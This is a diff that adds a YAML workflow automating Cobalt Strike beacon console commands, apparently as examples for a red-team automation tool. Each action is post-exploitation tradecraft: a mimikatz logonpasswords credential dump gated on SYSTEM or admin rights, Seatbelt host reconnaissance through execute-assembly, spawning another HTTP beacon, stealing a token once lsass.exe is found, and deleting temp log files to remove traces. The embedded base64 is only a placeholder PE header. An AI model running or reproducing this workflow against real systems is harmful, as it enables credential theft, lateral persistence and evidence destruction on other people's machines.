@@ -1,0 +1,74 @@
+name: Console Command Examples
+# Interactive beacon selection (no beacon_id specified)
+
+# This workflow demonstrates the consolecommand action type, which allows
+# executing any Cobalt Strike console command including server-side aliases.
+
+actions:
+  # Simple command - process list
+  - name: list_processes
+    type: consolecommand
+    parameters:
+      command: "ps"
+
+  # Command with arguments - mimikatz
+  - name: dump_credentials
+    type: consolecommand
+    parameters:
+      command: "mimikatz"
+      arguments: "privilege::debug sekurlsa::logonpasswords"
+    any_of:
+      - source: beacon.user
+        operator: contains
+        value: "SYSTEM"
+      - source: beacon.isAdmin
+        operator: equals
+        value: "true"
+
+  # Execute-assembly with @files reference
+  - name: run_seatbelt
+    type: consolecommand
+    parameters:
+      command: "execute-assembly"
+      arguments: "@files/Seatbelt.exe -group=system"
+      files:
+        # In production, replace with actual base64 encoded Seatbelt.exe
+        Seatbelt.exe: "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAABACAAAAAAAAAAAAAAAA=="
+
+  # Spawn with @artifacts reference
+  - name: spawn_beacon
+    type: consolecommand
+    parameters:
+      command: "spawn"
+      arguments: "@artifacts/beacon_http.exe"
+
+  # Custom aggressor command (if defined server-side)
+  - name: custom_recon
+    type: consolecommand
+    parameters:
+      command: "custom_enum"
+      arguments: "--full"
+
+  # Token manipulation
+  - name: steal_token
+    type: consolecommand
+    parameters:
+      command: "steal_token"
+      arguments: "1234"  # Replace with actual PID
+    conditions:
+      - source: list_processes
+        operator: contains
+        value: "lsass.exe"
+
+  # Cleanup on success
+  - name: cleanup_logs
+    type: consolecommand
+    parameters:
+      command: "shell"
+      arguments: "del C:\\Windows\\Temp\\*.log"
+    on_success:
+      - name: verify_cleanup
+        type: consolecommand
+        parameters:
+          command: "shell"
+          arguments: "dir C:\\Windows\\Temp"
